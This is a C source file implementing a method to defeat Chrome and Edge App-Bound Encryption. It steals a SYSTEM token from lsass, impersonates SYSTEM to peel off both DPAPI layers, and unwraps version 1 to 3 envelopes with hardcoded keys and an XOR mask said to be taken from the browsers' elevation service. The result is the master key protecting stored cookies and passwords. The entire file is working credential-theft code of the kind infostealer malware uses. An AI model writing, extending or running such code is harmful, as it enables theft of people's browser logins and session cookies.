#include "AbeDecrypt.h"

/*** method: Elevate (admin: SYSTEM + user DPAPI layers, then the private envelope) ***/

/* V1/V2 fixed keys, embedded (byte-identical) in the Chrome/Edge
   elevation_service.exe and ChatGPT's importer chrome.dll */
static const BYTE AbeV1Key[ABE_KEY_SIZE] = {
    0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
    0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87
};
static const BYTE AbeV2Key[ABE_KEY_SIZE] = {
    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60
};

/* V3 XOR mask, applied to the CNG-decrypted blob; embedded (byte-identical) in the
   Chrome/Edge elevation_service.exe and ChatGPT's importer chrome.dll */
static const BYTE AbeV3Mask[ABE_KEY_SIZE] = {
    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90
};

/* V1/V2 envelope: version[1] + nonce[12] + ciphertext[32] + tag[16]; the v20 key
   is wrapped with a fixed embedded key, no elevation needed to unwrap */
static BOOL
AbeV1V2Unwrap(
    _In_ ULONG EnvelopeVersion,
    _In_reads_bytes_(ABE_V12_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    NTSTATUS Status;

    Status = EnvelopeVersion == 1 ?
        AbeAesGcmOpen(AbeV1Key, Envelope + 1, Envelope + 13, ABE_KEY_SIZE, Envelope + 45, Key) :
        AbeChaChaPoly1305Open(AbeV2Key, Envelope + 1, Envelope + 13, ABE_KEY_SIZE, Envelope + 45, Key);
    if (!NT_SUCCESS(Status))
    {
        AbeLog(L"V%lu: AEAD envelope unwrap failed, 0x%08lX\r\n", EnvelopeVersion, Status);
        return FALSE;
    }
    return TRUE;
}

/* V3 envelope unwrap; must run impersonating SYSTEM (the CNG key lives in the
   SYSTEM profile's Microsoft Software KSP store) */
static BOOL
AbeV3Unwrap(
    _In_ const ABE_BROWSER* Entry,
    _In_reads_bytes_(ABE_V3_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    NCRYPT_PROV_HANDLE Provider = 0;
    NCRYPT_KEY_HANDLE CngKey = 0;
    BYTE Derived[ABE_KEY_SIZE];
    DWORD Length;
    SECURITY_STATUS St;
    NTSTATUS Status;
    ULONG i;

    St = NCryptOpenStorageProvider(&Provider, MS_KEY_STORAGE_PROVIDER, 0);
    if (FAILED(St))
    {
        AbeLog(L"V3: NCryptOpenStorageProvider failed, 0x%08lX\r\n", (unsigned long)St);
        return FALSE;
    }
    St = NCryptOpenKey(Provider, &CngKey, Entry->CngKey, 0, 0);
    if (FAILED(St))
    {
        AbeLog(L"V3: NCryptOpenKey(%ls) failed, 0x%08lX\r\n", Entry->CngKey, (unsigned long)St);
        NCryptFreeObject(Provider);
        return FALSE;
    }

    /* raw 32->32 decrypt, as done by the browsers' elevation service and ChatGPT's importer */
    St = NCryptDecrypt(CngKey,
                       (PBYTE)Envelope + 1,
                       ABE_KEY_SIZE,
                       NULL,
                       Derived,
                       sizeof(Derived),
                       &Length,
                       NCRYPT_SILENT_FLAG);
    NCryptFreeObject(CngKey);
    NCryptFreeObject(Provider);
    if (FAILED(St))
    {
        AbeLog(L"V3: NCryptDecrypt failed, 0x%08lX\r\n", (unsigned long)St);
        return FALSE;
    }
    if (Length != ABE_KEY_SIZE)
    {
        AbeLog(L"V3: NCryptDecrypt returned %lu bytes\r\n", Length);
        return FALSE;
    }

    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Derived[i] ^= AbeV3Mask[i];
    }
    /* Envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
    Status = AbeAesGcmOpen(Derived,
                           Envelope + 33,
                           Envelope + 45,
                           ABE_KEY_SIZE,
                           Envelope + 77,
                           Key);
    RtlSecureZeroMemory(Derived, sizeof(Derived));
    if (!NT_SUCCESS(Status))
    {
        AbeLog(L"V3: AES-256-GCM verification failed, 0x%08lX (bad tag?)\r\n", Status);
        return FALSE;
    }
    return TRUE;
}

/* innermost user-DPAPI payload: [u32 len][validation data][u32 len][payload];
   legacy Edge carries a raw key, Chrome/Edge a private envelope V1/V2/V3 */
static BOOL
AbeUnwrapInnerPayload(
    _In_ const ABE_BROWSER* Entry,
    _In_reads_bytes_(Size) const BYTE* Data,
    _In_ DWORD Size,
    _In_ HANDLE SystemToken,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
    _Out_ PULONG EnvelopeVersion)
{
    ULONG ValidationLength, PayloadLength;
    const BYTE* Payload;

    /* every subtraction below is guarded by the previous check, no overflow */
    if (Size < 8)
    {
        goto _Malformed;
    }
    RtlCopyMemory(&ValidationLength, Data, sizeof(ValidationLength));
    if (ValidationLength > Size - 8)
    {
        goto _Malformed;
    }
    RtlCopyMemory(&PayloadLength, Data + 4 + ValidationLength, sizeof(PayloadLength));
    Payload = Data + 8 + ValidationLength;
    if (PayloadLength > Size - 8 - ValidationLength)
    {
        goto _Malformed;
    }

    if (PayloadLength == ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
    {
        /* V3: the CNG unwrap must run as SYSTEM */
        if (!NT_SUCCESS(PS_Impersonate(SystemToken)))
        {
            return FALSE;
        }
        {
            BOOL Ok = AbeV3Unwrap(Entry, Payload, Key);

            PS_Impersonate(NULL);
            if (Ok)
            {
                *EnvelopeVersion = 3;
            }
            return Ok;
        }
    }
    if (PayloadLength == ABE_V12_ENVELOPE_SIZE && Payload[0] >= 1 && Payload[0] <= 2)
    {
        /* V1/V2: fixed embedded key, any context */
        if (!AbeV1V2Unwrap(Payload[0], Payload, Key))
        {
            return FALSE;
        }
        *EnvelopeVersion = Payload[0];
        return TRUE;
    }
    if (PayloadLength == ABE_KEY_SIZE)
    {
        *EnvelopeVersion = 0;
        RtlCopyMemory(Key, Payload, ABE_KEY_SIZE);
        return TRUE;
    }
    AbeLog(L"Elevate: unsupported payload (%lu bytes)\r\n", PayloadLength);
    return FALSE;

_Malformed:
    AbeLog(L"Elevate: malformed inner data (%lu bytes)\r\n", Size);
    return FALSE;
}

_Success_(return)
BOOL
AbeGetKeyElevate(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
    _Out_opt_ PULONG EnvelopeVersion)
{
    static BYTE Blob[4096];
    DATA_BLOB In, Out = { 0 };          /* Out is freed on failure paths */
    ULONG BlobLength = sizeof(Blob);    /* in/out capacity */
    ULONG LsaProcessId, Envelope;
    HANDLE SystemToken = NULL;
    NTSTATUS Status;
    BOOL Ok = FALSE;

    if (!AbeReadOsCryptBlob(Browser->UserDataDir,
                            L"app_bound_encrypted_key",
                            Blob,
                            sizeof(Blob),
                            &BlobLength) ||
        BlobLength <= 4 || memcmp(Blob, "APPB", 4) != 0)
    {
        AbeLog(L"Elevate: failed to read app_bound_encrypted_key\r\n");
        return FALSE;
    }

    /* duplicate the SYSTEM impersonation token from lsass (admin needed) */
    Status = Sys_GetLsaProcessId(&LsaProcessId);
    if (NT_SUCCESS(Status))
    {
        Status = PS_DuplicateSystemToken(LsaProcessId, TokenImpersonation, &SystemToken);
    }
    if (!NT_SUCCESS(Status))
    {
        AbeLog(L"Elevate: cannot obtain SYSTEM token, 0x%08lX (admin required)\r\n", Status);
        return FALSE;
    }

    /* layer 1: SYSTEM DPAPI */
    In.pbData = Blob + 4;
    In.cbData = BlobLength - 4;
    Status = PS_Impersonate(SystemToken);
    if (!NT_SUCCESS(Status))
    {
        AbeLog(L"Elevate: impersonating SYSTEM failed, 0x%08lX\r\n", Status);
        goto _Exit;
    }
    if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out))
    {
        PS_Impersonate(NULL);
        AbeLog(L"Elevate: SYSTEM DPAPI decrypt failed, gle=%lu\r\n", Err_GetLastError());
        goto _Exit;
    }
    PS_Impersonate(NULL);

    /* layer 2: user DPAPI, then unwrap the innermost structure */
    In.pbData = Out.pbData;
    In.cbData = Out.cbData;
    {
        DATA_BLOB Final = { 0 };        /* Final is freed on all paths below */

        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Final))
        {
            AbeLog(L"Elevate: user DPAPI decrypt failed, gle=%lu\r\n", Err_GetLastError());
        } else
        {
            Ok = AbeUnwrapInnerPayload(&AbeBrowsers[Browser->Type],
                                       Final.pbData,
                                       Final.cbData,
                                       SystemToken,
                                       Key,
                                       &Envelope);
            RtlSecureZeroMemory(Final.pbData, Final.cbData);
        }
        LocalFree(Final.pbData);
    }
    LocalFree(Out.pbData);

_Exit:
    NtClose(SystemToken);
    if (Ok && EnvelopeVersion != NULL)
    {
        *EnvelopeVersion = Envelope;
    }
    return Ok;
}
